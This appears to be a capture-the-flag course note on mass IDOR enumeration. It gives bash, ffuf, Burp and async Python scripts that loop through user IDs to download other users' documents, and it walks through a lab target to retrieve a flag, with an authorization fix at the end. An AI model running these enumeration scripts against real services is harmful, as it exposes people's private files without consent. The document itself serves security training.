# Section 8 — Mass IDOR Enumeration

---

## When Increment Works

Sequential integer references are the easiest IDORs to exploit at scale. Loop through the range, request each, collect the data.

```bash
# Quick check — manually probe a few values
curl -sk "http://TARGET/documents.php?uid=1"
curl -sk "http://TARGET/documents.php?uid=2"   # different content?
curl -sk "http://TARGET/documents.php?uid=3"   # different content?
```

If each `uid` returns different data, the resource lookup is by-ID only (no owner check) → exploitable.

---

## Mass Enumeration Patterns

### Pattern 1 — Bash loop + grep + wget

```bash
URL="http://TARGET"

for i in {1..100}; do
  for link in $(curl -sk "$URL/documents.php?uid=$i" | grep -oP "/documents/[^\"\x27]+"); do
    wget -q "$URL$link"
  done
done
```

### Pattern 2 — ffuf

```bash
ffuf -w <(seq 1 100) -u "http://TARGET/documents.php?uid=FUZZ" -mc 200 -t 30
```

### Pattern 3 — Burp Intruder
- Set `uid=§1§` as payload position
- Numbers payload type, range 1-100
- Start attack → sort by response size to find anomalies (smaller = less data, larger = more accounts)

### Pattern 4 — Python aiohttp (fastest for large ranges)
```python
import asyncio, aiohttp

async def fetch(session, uid):
    async with session.get(f"http://TARGET/documents.php?uid={uid}") as r:
        text = await r.text()
        if "Invoice" in text:
            print(uid, "→ has docs")
            return text
    return None

async def main():
    async with aiohttp.ClientSession() as s:
        tasks = [fetch(s, i) for i in range(1, 1001)]
        await asyncio.gather(*tasks)

asyncio.run(main())
```

---

## Extracting URLs from Response

Grep + regex is the cleanest way to pull file references:

```bash
# Extract paths matching /documents/...pdf
curl -sk "$URL/documents.php?uid=3" | grep -oP "/documents/[^\"\x27]+"

# More flexible — any href pointing to /documents/:
curl -sk "$URL/documents.php?uid=3" | grep -oP 'href="(/documents[^"]+)"'

# All file extensions:
curl -sk "$URL/documents.php?uid=3" | grep -oP "/documents/[^\"\x27]+\.(pdf|txt|docx?|xlsx?|csv)"
```

---

## Watch for Hidden Files

Mass enumeration is most valuable when it reveals **unusual** filenames buried among normal ones. Among 200 invoice PDFs, a `flag_<hash>.txt` or `backup_<date>.sql` stands out.

```bash
# Find any non-standard filename in the dump
for i in {1..100}; do
  curl -sk "$URL/documents.php?uid=$i" | grep -oP "/documents/[^\"\x27]+" | grep -v "Invoice\|Report"
done
```

---

## When the Request Isn't GET

The lab uses POST via `$.redirect()` — the JS pretends the link is a normal `<a href>` but actually sends a POST. Notice the JS:
```javascript
function getDocuments(uid) {
    $.redirect("/documents.php", {uid: uid}, "POST", "_self");
}
```

Switch curl accordingly:
```bash
curl -sk -X POST "$URL/documents.php" -d "uid=$i"
```

Always inspect the page JS / browser Network tab to confirm the actual method. Many AJAX-heavy apps obscure POST behind innocuous-looking link clicks.

---

## Lab — Mass Enumerate uid 1-20

**Target:** `154.57.164.71:30652`

Page uses POST (not GET) for `/documents.php?uid=`. Loop POST requests, pull file paths, look for non-`Invoice`/`Report` names:

```bash
URL="http://154.57.164.71:30652"

for i in {1..20}; do
  docs=$(curl -sk -X POST "$URL/documents.php" -d "uid=$i" \
    | grep -oP "/documents/[^\"\x27]+")
  if [ -n "$docs" ]; then
    echo "uid=$i:"
    echo "$docs"
  fi
done
```

Output (truncated):
```
uid=1:  /documents/Invoice_1_09_2021.pdf, Report_1_10_2021.pdf
...
uid=15:
  /documents/Invoice_15_11_2020.pdf
  /documents/Report_15_01_2020.pdf
  /documents/flag_11dfa168ac8eb2958e38425728623c98.txt   ← anomaly
...
uid=20: ...standard pdfs
```

Read the flag file directly:
```bash
curl -sk "http://154.57.164.71:30652/documents/flag_11dfa168ac8eb2958e38425728623c98.txt"
# → HTB{4ll_f1l35_4r3_m1n3}
```

**Flag:** `HTB{4ll_f1l35_4r3_m1n3}`

---

## Exam Notes

- **Always confirm the HTTP method** before scripting — JS `$.redirect()` calls POST while looking like a GET link
- **Pattern recognition**: when looping references, anomalous filenames (one user with `.txt` among all `.pdf`s) is the flag indicator
- Static-file IDOR (predictable filenames like `Invoice_<uid>_<date>.pdf`) is the secondary attack vector — even when the application enforces uid filtering, direct file access often doesn't
- For real bug bounty: pair mass enumeration with output diff — sort response sizes, the outlier rows are the interesting ones
- The fix is server-side authZ: `SELECT * FROM documents WHERE uid = $logged_in_uid` not `WHERE uid = $_REQUEST['uid']`
